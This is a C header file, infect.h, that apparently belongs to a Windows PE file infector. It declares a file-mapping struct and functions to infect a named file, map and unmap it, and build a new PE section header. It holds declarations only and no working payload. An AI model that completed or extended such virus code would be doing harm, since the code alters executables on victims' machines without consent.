#ifndef INFECT_H
#define INFECT_H

#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#include "data.h"
#include "utility.h"

typedef struct {
  HANDLE  hFile;
  HANDLE  hMap;
  void*   startAddress;
  DWORD   size;
}file_view_t;

int infect(const char* filename, data_t* data);

int open_file_view(const char* filename, file_view_t* fileView, data_t* data);
void close_file_view(file_view_t* fileView, data_t* data);
void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data);



#endif
